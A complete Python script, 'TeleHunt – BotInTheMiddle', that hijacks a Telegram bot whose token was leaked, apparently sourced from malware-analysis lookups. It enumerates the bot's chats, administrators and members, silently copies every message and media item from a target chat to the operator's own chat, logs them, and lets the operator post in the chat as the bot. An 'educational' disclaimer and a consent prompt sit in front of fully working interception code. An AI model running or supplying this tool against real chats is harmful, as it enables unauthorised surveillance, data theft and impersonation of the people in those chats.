#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# === LIBRARIES ===
import requests
import time
from datetime import datetime, timezone
import threading
import os

# === CONFIGURATION ===
BOT_TOKEN = "" # Bot Token can be found in https://intelligence.any.run/analysis/lookup#{%22query%22:%22api.telegram.org/bot%22,%22dateRange%22:180}
CHAT_SOURCE = "" # ID of the source Chat (group, channel, etc.)
CHAT_DESTINATION = "" # ID of the destination chat (Your own Chat ID)

# === COLOR DEFINITIONS ===
RED = "\033[38;2;255;0;0m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"
PURPLE = "\033[38;5;177m"
DRKGREEN = "\033[38;2;0;100;0m"

print(f"""{RED}
                     _____    _      _   _             _   
                    |_   _|__| | ___| | | |_   _ _ __ | |_ 
                      | |/ _ \\ |/ _ \\ |_| | | | | '_ \\| __|
                      | |  __/ |  __/  _  | |_| | | | | |_ 
                      |_|\\___|_|\\___|_| |_|\\__,_|_| |_|\\__|
                                {WHITE}🤖 {BOLD}{CYAN}B{BLUE}o{CYAN}t{BLUE}I{CYAN}n{GREEN}T{DRKGREEN}h{GREEN}e{DRKGREEN}M{GREEN}i{DRKGREEN}d{GREEN}d{DRKGREEN}l{GREEN}e
                        {PURPLE}C{MAGENTA}o{PURPLE}d{MAGENTA}e{PURPLE}d {MAGENTA}b{PURPLE}y {MAGENTA}J{PURPLE}i{MAGENTA}m{PURPLE}m{MAGENTA}y {PURPLE}B{MAGENTA}i{PURPLE}a{MAGENTA}n{PURPLE}c{MAGENTA}o {WHITE}- {RESET}{YELLOW}v20251011
             {WHITE}Telegram Bots API: https://core.telegram.org/bots/api
{RESET}""")

print(f"{YELLOW}{BOLD}DISCLAIMER / RESPONSIBLE USE:{RESET}")
print(f"- This tool was created for educational purposes only.")
print(f"- The author is NOT responsible for any misuse or illegal activity conducted with this software.")
print(f"- Do not use this tool to access chats, messages, or personal information without explicit permission from all parties involved.")
print(f"- By running this program, you acknowledge that you will use it legally.\n{RESET}")

consent = input(f"{MAGENTA}Do you agree to use it legally? (yes/no): {RESET}")
if consent.lower() != "yes":
    print(f"{RED}! You must agree to use this tool legally. Exiting...{RESET}")
    exit()

if not BOT_TOKEN:
    BOT_TOKEN = str(input(f"{YELLOW}🔑 {RESET}Set the BOT_TOKEN: "))
print(f"{GREEN}✅ {RESET}BOT_TOKEN configured successfully.")

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# === GLOBAL VARIABLES ===
bot_username = "unknown_bot"
src_chat_title = "unknown_chat"

# === BASE FUNCTIONS ===
def get_updates(offset=None):
    """Fetches updates from the bot."""
    try:
        params = {"timeout": 100, "offset": offset}
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=120)
        if r.status_code == 200:
            return r.json().get("result", [])
        else:
            print(f"{RED}❌ Error in get_updates: {r.text}{RESET}")
            return []
    except Exception as e:
        print(f"{YELLOW}⚠️ Error in get_updates: {e}{RESET}")
        return []

def send_text(chat_id, text):
    """Sends a text message to the specified chat."""
    url = f"{API_URL}/sendMessage"
    data = {"chat_id": chat_id, "text": text}
    r = requests.post(url, data=data)
    if r.status_code != 200:
        print(f"{RED}❌ Error sending text: {r.text}{RESET}")

def copy_message(chat_id_source, message_id, caption=None):
    """Copies multimedia messages (photo, video, document, etc.)."""
    url = f"{API_URL}/copyMessage"
    data = {
        "chat_id": CHAT_DESTINATION,
        "from_chat_id": chat_id_source,
        "message_id": message_id
    }
    if caption:
        data["caption"] = caption
    r = requests.post(url, data=data)
    if r.status_code != 200:
        print(f"{RED}❌ Error copying message: {r.text}{RESET}")

# === LOGGING FUNCTION ===
def log_message(chat_id, chat_title, sender, message_type="Text received", content=""):
    fecha = datetime.now(timezone.utc).strftime("%Y%m%d")
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, f"log_{chat_id}_{fecha}.txt")

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"[{message_type}]\n")
        f.write(f"🕒 {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} [UTC]\n")
        f.write(f"💬 Chat ID: {chat_id}\n")
        f.write(f"🏷️  Chat Title: {chat_title}\n")
        if message_type == "Text sent":
            f.write(f"🤖 From: @{sender}\n")
        else:
            f.write(f"👤 From: @{sender}\n")
        if content:
            f.write(f"📨 Message: {content}\n")
        f.write("-" * 50 + "\n")

# === INITIAL INFORMATION ===
def show_initial_info():
    print(f"\n{BLUE}## BOT INFORMATION ###################################################################### (/getMe) #{RESET}")
    url = f"{API_URL}/getMe"
    response = requests.get(url)
    if response.status_code == 200:
        bot_info = response.json()["result"]
        print(f"{GREEN}🤖 Bot ID:{RESET} {bot_info['id']}")
        print(f"{GREEN}📛 Name:{RESET} {bot_info['first_name']}")
        print(f"{GREEN}🔗 Username:{RESET} @{bot_info['username']}")
        print(f"Json: {bot_info}")
        global bot_username
        bot_username = bot_info['username']
    else:
        print(f"{RED}❌ {YELLOW}Error fetching bot information:{RESET} {response.status_code}")

    print(f"\n{BLUE}## LAST UPDATES #################################################################### (/getUpdates) #{RESET}")
    url = f"{API_URL}/getUpdates"
    response = requests.get(url)
    if response.status_code == 200:
        updates = response.json().get("result", [])
        print(f"{GREEN}📨 Found {len(updates)} recent updates.{RESET}")
        print(f"Json: {updates}")
        if updates:
            last = updates[-1].get("message", {})
            sender = last.get("from", {}).get("username", "N/A")
            text = last.get("text", "🖼️ [Multimedia]")
            print(f"{CYAN}🕒 Last message from @{sender}:{RESET} {text}")
    else:
        print(f"{RED}❌ {YELLOW}Error fetching bot updates:{RESET} {response.status_code}")

    global CHAT_SOURCE
    global CHAT_DESTINATION
    if not CHAT_SOURCE:
        print(f"\n{BLUE}## SET CHAT SOURCE ################################################################# (CHAT_SOURCE) #{RESET}")
        CHAT_SOURCE = input(f"{YELLOW}🔑 {RESET}Set the source chat_id: ")
    CHAT_SOURCE = int(CHAT_SOURCE)
    print(f"{GREEN}✅ {RESET}CHAT_SOURCE configured successfully.")

    if not CHAT_DESTINATION:
        print(f"\n{BLUE}## SET CHAT DESTINATION ####################################################### (CHAT_DESTINATION) #{RESET}")
        print(f"The destination chat_id is where the messages will be copied, It can be other group or your own chat_id")
        print(f"To get the chat_id, first start a conversation with the Bot {CYAN}@{bot_username} {RESET}and check {API_URL}/getUpdates")
        CHAT_DESTINATION = input(f"\n{YELLOW}🔑 {RESET}Set the destination chat_id: ")
    CHAT_DESTINATION = int(CHAT_DESTINATION)
    print(f"{GREEN}✅ {RESET}CHAT_DESTINATION configured successfully.")

    print(f"\n{BLUE}## USER INFORMATION ############################################################# (/getChatMember) #{RESET}")
    url = f"{API_URL}/getChatMember"
    params = {"chat_id": CHAT_SOURCE, "user_id": CHAT_SOURCE}
    response = requests.post(url, params=params)
    if response.status_code == 200:
        user_info = response.json()['result']['user']
        print('# ', user_info)
    else:
        print(f"{RED}❌ {YELLOW}Error fetching user information:{RESET} {response.status_code}")

    print(f"\n{BLUE}## SOURCE CHAT INFO ################################################################### (/getChat) #{RESET}")
    url = f"{API_URL}/getChat"
    params = {"chat_id": CHAT_SOURCE}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        chat_info = response.json()["result"]
        print(f"{GREEN}💬 Chat ID:{RESET} {chat_info['id']}")
        print(f"{GREEN}🏷️  Chat Title:{RESET} {chat_info.get('title', 'No title')}")
        print(f"{GREEN}👥 Type:{RESET} {chat_info['type']}")
        print(f"Json: {chat_info}")
        global src_chat_title
        src_chat_title = chat_info.get('title', 'No title')
    else:
        print(f"{RED}❌ {YELLOW}Error fetching source chat information:{RESET} {response.status_code}")

    print(f"\n{BLUE}## CHAT ADMINISTRATORS ################################################## (/getChatAdministrators) #{RESET}")
    url = f"{API_URL}/getChatAdministrators"
    params = {"chat_id": CHAT_SOURCE}
    response = requests.post(url, params=params)
    if response.status_code == 200:
        chat_administrators = response.json()['result']
        print('# ', chat_administrators)
    else:
        print(f"{RED}❌ {YELLOW}Error fetching administrators information:{RESET} {response.status_code}")

    print(
        f"\n{BLUE}## CHAT MEMBER COUNT ####################################################### (/getChatMemberCount) #{RESET}")
    url = f"{API_URL}/getChatMemberCount"
    params = {"chat_id": CHAT_SOURCE}
    response = requests.post(url, params=params)
    if response.status_code == 200:
        member_count = response.json()['result']
        print('# ', member_count)
    else:
        print(f"{RED}❌ {YELLOW}Error fetching member count:{RESET} {response.status_code}")

    print(f"\n{BLUE}## DESTINATION CHAT INFO ############################################################## (/getChat) #{RESET}")
    url = f"{API_URL}/getChat"
    params = {"chat_id": CHAT_DESTINATION}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        chat_info = response.json()["result"]
        print(f"{GREEN}💬 Chat ID:{RESET} {chat_info['id']}")
        print(f"{GREEN}🏷️  Chat Title:{RESET} {chat_info.get('title', 'No title')}")
        print(f"{GREEN}👥 Type:{RESET} {chat_info['type']}")
        print(f"Json: {chat_info}")
    else:
        print(f"{RED}❌ {YELLOW}Error fetching destination chat information:{RESET} {response.status_code}")
    print(f"{BLUE}{'#' * 100}{RESET}")

# === AUTOMATIC LISTENING AND FORWARDING ===
def listen_and_forward():
    print(f"{CYAN}\n🤖 Bot listening and copying messages from source chat {CHAT_SOURCE} ({src_chat_title}) to destination {CHAT_DESTINATION}...{RESET}")
    last_update_id = None

    while True:
        updates = get_updates(offset=last_update_id)
        for update in updates:
            if "message" in update:
                message = update["message"]
                chat_id = message["chat"]["id"]

                if chat_id == CHAT_SOURCE:
                    message_id = message["message_id"]
                    user = message.get("from", {})
                    username = user.get("username", "")
                    first_name = user.get("first_name", "")
                    chat_title = message["chat"].get("title", "No title")

                    header = f"🕒 {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} [UTC]\n💬 Chat ID: {chat_id}\n🏷️  Chat Title: {chat_title}\n👤 From: @{username}"

                    if "text" in message:
                        text_content = message["text"]
                        full_message = f"{header}\n📨 Message: {text_content}"
                        send_text(CHAT_DESTINATION, full_message)
                        log_message(chat_id, chat_title, username or first_name, "Text received", text_content)
                        print(f"\n{BLUE}[Text received]{RESET}\n{full_message}\n{'-' * 50}")
                    else:
                        copy_message(chat_id, message_id, caption=header)
                        log_message(chat_id, chat_title, username or first_name, "Multimedia")
                        print(f"\n{YELLOW}[Multimedia received]{RESET}\n{header}\n📨 Message: Multimedia message copied.\n{'-' * 50}")

                    last_update_id = update["update_id"] + 1
                    print(f"{MAGENTA}Message: {RESET}")

        time.sleep(1)

# === MANUAL SENDING (from console) ===
def send_from_console():
    print(f"{CYAN}💬 Type a message to send it to CHAT_SOURCE {CHAT_SOURCE} ({src_chat_title}). Type '{RESET}exit{CYAN}' to quit.\n{RESET}")
    while True:
        text = input(f"{MAGENTA}Message: {RESET}")
        if text.lower() == "exit":
            print(f"{RED}🛑 Exiting manual mode.{RESET}")
            break
        send_text(CHAT_SOURCE, text)
        log_message(CHAT_SOURCE, src_chat_title, bot_username, "Text sent", text)
        full_message = f"🕒 {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} [UTC]\n💬 Chat ID: {CHAT_SOURCE}\n🏷️  Chat Title: {src_chat_title}\n🤖 From: @{bot_username}\n📨 Message: {text}"
        print(f"{GREEN}[Text sent]{RESET}\n{full_message}\n{'-' * 50}")

# === MAIN ===
if __name__ == "__main__":
    show_initial_info()
    listening_thread = threading.Thread(target=listen_and_forward, daemon=True)
    listening_thread.start()
    send_from_console()
  
